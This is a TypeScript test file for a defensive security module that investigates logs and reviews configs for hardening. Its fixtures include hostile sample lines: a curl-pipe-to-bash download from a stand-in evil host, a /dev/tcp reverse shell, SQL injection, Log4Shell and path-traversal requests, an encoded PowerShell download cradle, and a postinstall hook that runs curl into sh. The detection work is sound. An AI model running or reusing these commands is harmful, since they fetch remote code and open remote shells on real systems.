// Security lane tests: routing, indicators, the investigation detectors, the
// config checks with their exact fixes, and the hygiene rules (indicators
// defanged, secrets masked) that every report must keep.

import { describe, it, expect } from "vitest";
import {
  decodePowerShell,
  defang,
  detectConfigType,
  detectSecurityRequest,
  extractIndicators,
  findSecrets,
  genericSecurityPrompt,
  hardeningGuidePrompt,
  hardeningReview,
  hardeningTopic,
  investigate,
  isPrivateIp,
  looksLikeLogs,
  maskSecrets,
  parseTimestamp,
  patchSshd,
  renderSecurityMarkdown,
  securityPrompt,
} from "../lib/securityLane";

const utf16b64 = (s: string) => btoa([...s].map((c) => String.fromCharCode(c.charCodeAt(0) & 0xff, c.charCodeAt(0) >> 8)).join(""));

const AUTH_LOG = [
  ...Array.from({ length: 30 }, (_, i) => `Oct  4 03:1${Math.floor(i / 10)}:${String(i % 60).padStart(2, "0")} web01 sshd[2211]: Failed password for ${i % 2 ? "root" : "invalid user admin"} from 203.0.113.50 port 51${i} ssh2`),
  "Oct  4 03:14:02 web01 sshd[2290]: Accepted password for deploy from 203.0.113.50 port 51999 ssh2",
  "Oct  4 03:15:10 web01 useradd[2301]: new user: name=backup2, UID=1002, GID=1002, home=/home/backup2",
  "Oct  4 03:15:20 web01 usermod[2302]: add 'backup2' to group 'sudo'",
  "Oct  4 03:16:00 web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/crontab -e",
  "Oct  4 03:16:30 web01 bash[2310]: curl -s http://evil.example.xyz/x.sh | bash",
  "Oct  4 03:17:00 web01 bash[2311]: bash -i >& /dev/tcp/198.51.100.23/4444 0>&1",
  "Oct  4 03:18:00 web01 bash[2312]: history -c",
  "Oct  4 03:18:30 web01 sshd[2400]: Accepted publickey for ops from 10.0.0.5 port 40100 ssh2",
].join("\n");

const ACCESS_LOG = [
  '198.51.100.9 - - [04/Oct/2026:09:00:01 +0000] "GET /products?id=1%27%20union%20select%20password%20from%20users-- HTTP/1.1" 200 5123 "-" "sqlmap/1.8"',
  '198.51.100.9 - - [04/Oct/2026:09:00:02 +0000] "GET /../../etc/passwd HTTP/1.1" 404 120 "-" "sqlmap/1.8"',
  '198.51.100.9 - - [04/Oct/2026:09:00:03 +0000] "GET /?x=${jndi:ldap://bad.example.top/a} HTTP/1.1" 400 0 "-" "curl/8"',
  '203.0.113.77 - - [04/Oct/2026:09:01:00 +0000] "GET /.env HTTP/1.1" 404 0 "-" "Mozilla/5.0"',
  '192.168.1.20 - - [04/Oct/2026:09:02:00 +0000] "GET /index.html HTTP/1.1" 200 900 "-" "Mozilla/5.0"',
].join("\n");

describe("routing", () => {
  it("investigates logs and hardens configs, by words or by what was attached", () => {
    expect(detectSecurityRequest("investigate this", AUTH_LOG)).toBe("investigate");
    expect(detectSecurityRequest("what happened here?", AUTH_LOG)).toBe("investigate");
    expect(detectSecurityRequest("summarize these logs", AUTH_LOG)).toBe("investigate");
    expect(detectSecurityRequest("harden this", "PermitRootLogin yes\nPasswordAuthentication yes")).toBe("harden");
    expect(detectSecurityRequest("review my sshd config", "PermitRootLogin yes\nPasswordAuthentication yes")).toBe("harden");
    expect(detectSecurityRequest("summarize this file", "FROM node:latest\nRUN npm i")).toBeNull(); // summarising a config is not a review
    expect(detectSecurityRequest("summarize this document", "Quarterly results were strong across regions.")).toBeNull();
  });

  it("answers 'harden my X' with a guide, and leaves ordinary chat alone", () => {
    expect(detectSecurityRequest("how do I harden my postgres server?")).toBe("harden");
    expect(hardeningTopic("harden my postgres server")).toBe("postgres");
    expect(hardeningTopic("lock down my home wifi router")).toBe("router");
    expect(detectSecurityRequest("make my AWS account more secure")).toBe("harden");
    expect(detectSecurityRequest("write a poem about servers")).toBeNull();
    expect(detectSecurityRequest("harden")).toBeNull(); // no topic, no material
  });

  it("recognises every supported config format", () => {
    expect(detectConfigType("Port 22\nPermitRootLogin no\n")).toBe("sshd");
    expect(detectConfigType("server {\n listen 80;\n server_name a.com;\n location / {}\n}")).toBe("nginx");
    expect(detectConfigType("FROM python:3.12\nRUN pip install x\nCMD [\"x\"]")).toBe("dockerfile");
    expect(detectConfigType("services:\n  web:\n    image: nginx\n")).toBe("compose");
    expect(detectConfigType("apiVersion: apps/v1\nkind: Deployment\n")).toBe("kubernetes");
    expect(detectConfigType("DB_PASSWORD=x\nAPI_KEY=y\n")).toBe("dotenv");
    expect(detectConfigType('{"name":"a","dependencies":{"x":"*"}}')).toBe("npm");
    expect(detectConfigType("on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n")).toBe("github-actions");
    expect(detectConfigType("just some prose about security")).toBeNull();
    expect(looksLikeLogs(AUTH_LOG)).toBe(true);
    expect(looksLikeLogs("one line\nanother line\nand a third")).toBe(false);
  });
});

describe("hygiene", () => {
  it("defangs indicators and masks secrets", () => {
    expect(defang("http://evil.example.xyz/x 203.0.113.50 a@b.com")).toBe("hxxp://evil.example[.]xyz/x 203.0.113[.]50 a[@]b[.]com");
    const masked = maskSecrets("key AKIAABCDEFGHIJKLMNOP and password=hunter2hunter2 and ghp_abcdefghijklmnopqrstuvwxyz0123456789");
    expect(masked).not.toContain("ABCDEFGHIJKLMNOP");
    expect(masked).not.toContain("hunter2hunter2");
    expect(masked).not.toContain("abcdefghijklmnopqrstuvwxyz0123456789");
    expect(findSecrets("-----BEGIN OPENSSH PRIVATE KEY-----")).toContain("private key");
    expect(isPrivateIp("10.1.2.3")).toBe(true);
    expect(isPrivateIp("172.20.0.1")).toBe(true);
    expect(isPrivateIp("8.8.8.8")).toBe(false);
  });

  it("reads the common timestamp formats", () => {
    expect(parseTimestamp("2026-10-04T09:00:01Z event", 2026)).toBe(Date.UTC(2026, 9, 4, 9, 0, 1));
    expect(parseTimestamp('1.2.3.4 - - [04/Oct/2026:09:00:01 +0200] "GET /"', 2026)).toBe(Date.UTC(2026, 9, 4, 7, 0, 1));
    expect(parseTimestamp("Oct  4 03:14:02 web01 sshd", 2026)).toBe(Date.UTC(2026, 9, 4, 3, 14, 2));
    expect(parseTimestamp("10/4/2026 3:14:02 PM An account failed", 2026)).toBe(Date.UTC(2026, 9, 4, 15, 14, 2));
    expect(parseTimestamp("no time here", 2026)).toBeNull();
  });
});

describe("investigation", () => {
  it("finds the brute force, the success that followed, and what the intruder did", () => {
    const r = investigate(AUTH_LOG, "auth.log", 2026);
    const ids = r.findings.map((f) => f.id);
    expect(ids).toContain("success-after-failure");
    expect(ids).toContain("brute-force-203.0.113.50");
    expect(ids).toEqual(expect.arrayContaining(["new-account", "admin-group", "download-cradle", "reverse-shell", "log-clearing", "sudo"]));
    expect(r.findings[0].severity).toBe("critical");
    const brute = r.findings.find((f) => f.id.startsWith("brute-force"))!;
    expect(brute.count).toBe(30);
    expect(brute.attack?.id).toBe("T1110.001");
    expect(r.timeline.first).toBe("2026-10-04T03:10:00Z");
    expect(r.timeline.last).toBe("2026-10-04T03:18:30Z");
    expect(r.indicators.ipsPublic).toEqual(expect.arrayContaining(["203.0.113.50", "198.51.100.23"]));
    expect(r.indicators.ipsPrivate).toContain("10.0.0.5");
    expect(r.indicators.users).toEqual(expect.arrayContaining(["root", "admin", "deploy", "ops"]));
    // Evidence is defanged: nothing in the report is clickable.
    for (const f of r.findings) for (const e of f.evidence) expect(e).not.toMatch(/https?:\/\//);
  });

  it("flags web attacks, and escalates the one that got a 200", () => {
    const r = investigate(ACCESS_LOG, "access.log", 2026);
    const titles = r.findings.map((f) => f.title).join(" | ");
    expect(r.findings.find((f) => f.id === "web-sqli")?.severity).toBe("critical"); // answered with 200
    expect(titles).toMatch(/answered with 200/);
    expect(titles).toMatch(/Log4Shell/);
    expect(titles).toMatch(/Path traversal/);
    expect(titles).toMatch(/scanner/i);
    expect(titles).toMatch(/sensitive files/);
  });

  it("decodes encoded PowerShell and catches Windows events", () => {
    const cmd = "IEX (New-Object Net.WebClient).DownloadString('http://bad.example.top/a')";
    expect(decodePowerShell(utf16b64(cmd))).toBe(cmd);
    const win = [
      ...Array.from({ length: 12 }, (_, i) => `2026-10-04T10:00:${String(i).padStart(2, "0")}Z EventID=4625 An account failed to log on. Source Network Address: 198.51.100.7 Account Name: svc_sql`),
      "2026-10-04T10:01:00Z EventID=4624 An account was successfully logged on. Source Network Address: 198.51.100.7 Account Name: svc_sql",
      "2026-10-04T10:02:00Z EventID=4720 A user account was created. Account Name: helpdesk2",
      "2026-10-04T10:02:30Z EventID=4732 A member was added to a security-enabled local group. Group: Administrators",
      `2026-10-04T10:03:00Z EventID=4688 New process: powershell.exe -nop -w hidden -enc ${utf16b64(cmd)}`,
      "2026-10-04T10:04:00Z EventID=1102 The audit log was cleared.",
    ].join("\n");
    const r = investigate(win, "security.evtx.txt", 2026);
    const ids = r.findings.map((f) => f.id);
    expect(ids).toEqual(expect.arrayContaining(["success-after-failure", "new-account", "admin-group", "encoded-powershell", "log-clearing"]));
    expect(r.findings.find((f) => f.id === "encoded-powershell")?.detail).toMatch(/Decoded: IEX \(New-Object Net\.WebClient\)\.DownloadString\('hxxp:\/\/bad\.example\[\.\]top\/a'\)/);
  });

  it("pulls every indicator type", () => {
    const i = extractIndicators("hash 44d88612fea8a8f36de82e1278abb02f and e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 from evil.example.ru mail bob@corp.example.com see CVE-2021-44228 dropped /tmp/.x/payload.sh and C:\\Users\\Public\\run.exe");
    expect(i.md5).toEqual(["44d88612fea8a8f36de82e1278abb02f"]);
    expect(i.sha256).toHaveLength(1);
    expect(i.domains).toContain("evil.example.ru");
    expect(i.emails).toEqual(["bob@corp.example.com"]);
    expect(i.cves).toEqual(["CVE-2021-44228"]);
    expect(i.paths).toEqual(expect.arrayContaining(["/tmp/.x/payload.sh", "C:\\Users\\Public\\run.exe"]));
  });

  it("briefs the model with evidence only, and renders a defanged report", () => {
    const r = investigate(AUTH_LOG, "auth.log", 2026);
    const p = securityPrompt(r, "what happened on web01?");
    expect(p).toContain("User request: what happened on web01?");
    expect(p).toContain("[CRITICAL] Login succeeded from a source that was guessing passwords");
    expect(p).toContain("203.0.113[.]50");
    expect(p).not.toMatch(/\b203\.0\.113\.50\b/);
    expect(p).toContain("Contain now");
    const md = renderSecurityMarkdown(r, "## What happened\nAn attacker guessed deploy's password.", "qwen3.8:27b");
    expect(md).toContain("# Investigation: auth.log");
    expect(md).toContain("| Severity | Finding | ATT&CK | Evidence |");
    expect(md).toContain("## Indicators (defanged)");
    expect(md).not.toMatch(/http:\/\/evil/);
  });
});

describe("hardening configs", () => {
  const SSHD = ["Port 22", "PermitRootLogin yes", "PasswordAuthentication yes", "X11Forwarding yes", "Ciphers aes128-cbc,aes256-ctr", "Match User backup", "  PasswordAuthentication yes"].join("\n");

  it("checks sshd and patches it, leaving Match blocks alone", () => {
    const r = hardeningReview(SSHD, "sshd_config")!;
    expect(r.configType).toBe("sshd");
    const ids = r.findings.map((f) => f.id);
    expect(ids).toEqual(expect.arrayContaining(["ssh-root", "ssh-passwords", "ssh-x11", "ssh-weak-ciphers", "ssh-allowlist"]));
    expect(r.findings.find((f) => f.id === "ssh-passwords")?.fix).toBe("PasswordAuthentication no");
    const patched = patchSshd(SSHD);
    expect(patched).toMatch(/^PermitRootLogin no {3}# hardened by PrismOS \(was: yes\)$/m);
    expect(patched).toMatch(/^PasswordAuthentication no/m);
    expect(patched).toContain("MaxAuthTries 3");
    expect(patched.indexOf("MaxAuthTries 3")).toBeLessThan(patched.indexOf("Match User backup"));
    expect(patched).toContain("Match User backup\n  PasswordAuthentication yes");
    expect(r.patched).toBe(patched);
  });

  it("checks nginx: TLS, headers, dotfiles, listings", () => {
    const r = hardeningReview("server {\n listen 80;\n server_name shop.example.com;\n autoindex on;\n ssl_protocols TLSv1 TLSv1.2;\n location / { root /var/www; }\n}", "nginx.conf")!;
    const ids = r.findings.map((f) => f.id);
    expect(ids).toEqual(expect.arrayContaining(["nginx-tls", "nginx-https", "nginx-headers", "nginx-autoindex", "nginx-dotfiles", "nginx-tokens"]));
    expect(r.findings.find((f) => f.id === "nginx-headers")?.fix).toContain("add_header Strict-Transport-Security");
  });

  it("checks Dockerfiles, compose files and Kubernetes manifests", () => {
    const d = hardeningReview("FROM node:latest\nENV API_KEY=abc123secret\nADD https://x.example.com/t.tgz /tmp/\nRUN curl -s https://get.example.com | sh\nEXPOSE 22\nCMD [\"node\",\"a.js\"]", "Dockerfile")!;
    expect(d.findings.map((f) => f.id)).toEqual(expect.arrayContaining(["docker-root", "docker-unpinned-node:latest", "docker-secret", "docker-add-url", "docker-curl-sh", "docker-ssh"]));
    expect(d.findings[0].severity).toBe("critical");
    for (const f of d.findings) for (const e of f.evidence) expect(e).not.toContain("abc123secret");

    const c = hardeningReview("services:\n  db:\n    image: postgres\n    ports:\n      - \"5432:5432\"\n    environment:\n      POSTGRES_PASSWORD: supersecret\n  agent:\n    image: tool:latest\n    privileged: true\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n    network_mode: host\n", "docker-compose.yml")!;
    expect(c.findings.map((f) => f.id)).toEqual(expect.arrayContaining(["compose-privileged", "compose-docker-sock", "compose-host-net", "compose-db-exposed", "compose-secrets", "compose-latest"]));

    const k = hardeningReview("apiVersion: v1\nkind: Pod\nspec:\n  hostNetwork: true\n  containers:\n    - name: app\n      image: app:latest\n      securityContext:\n        privileged: true\n      env:\n        - name: DB_PASSWORD\n          value: hunter2\n  volumes:\n    - name: h\n      hostPath:\n        path: /\n", "pod.yaml")!;
    expect(k.findings.map((f) => f.id)).toEqual(expect.arrayContaining(["k8s-privileged", "k8s-hostnetwork", "k8s-hostpath", "k8s-root", "k8s-limits", "k8s-latest", "k8s-secret-env"]));
  });

  it("never repeats a secret from a .env, and catches debug mode", () => {
    const env = "AWS_ACCESS_KEY_ID=AKIAABCDEFGHIJKLMNOP\nDB_PASSWORD=short\nDEBUG=true\nNODE_ENV=development\n";
    const r = hardeningReview(env, ".env")!;
    expect(r.findings.map((f) => f.id)).toEqual(expect.arrayContaining(["env-secrets", "env-weak-password", "env-debug"]));
    const all = JSON.stringify(r) + renderSecurityMarkdown(r, "verdict", "m");
    expect(all).not.toContain("ABCDEFGHIJKLMNOP");
    expect(all).not.toMatch(/DB_PASSWORD=short/);
  });

  it("checks package.json and GitHub Actions workflows", () => {
    const n = hardeningReview('{"scripts":{"postinstall":"curl -s https://x.example.com/i.sh | sh"},"dependencies":{"left-pad":"*","lib":"http://example.com/lib.tgz"}}', "package.json")!;
    expect(n.findings.map((f) => f.id)).toEqual(expect.arrayContaining(["npm-script-postinstall", "npm-unpinned", "npm-http", "npm-audit"]));
    const g = hardeningReview("on: pull_request_target\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - uses: some/action@v1\n      - run: echo \"${{ github.event.pull_request.title }}\"\n", ".github/workflows/ci.yml")!;
    expect(g.findings.map((f) => f.id)).toEqual(expect.arrayContaining(["gha-prt-checkout", "gha-permissions", "gha-unpinned", "gha-injection"]));
  });

  it("briefs the model with the exact fixes, and guides platforms without a file", () => {
    const r = hardeningReview(SSHD, "sshd_config")!;
    const p = securityPrompt(r, "harden this");
    expect(p).toContain("SSH server (sshd_config)");
    expect(p).toContain("fix: PasswordAuthentication no");
    const md = renderSecurityMarkdown(r, "Verdict: fix the password logins first.", "qwen3.8:27b");
    expect(md).toContain("## Exact fixes");
    const guide = hardeningGuidePrompt("postgres", "harden my postgres");
    expect(guide).toContain("pg_hba.conf: scram-sha-256");
    expect(guide).toContain("how to verify it worked");
    expect(genericSecurityPrompt("const key = 'AKIAABCDEFGHIJKLMNOP';", "review this for security")).not.toContain("ABCDEFGHIJKLMNOP");
  });
});
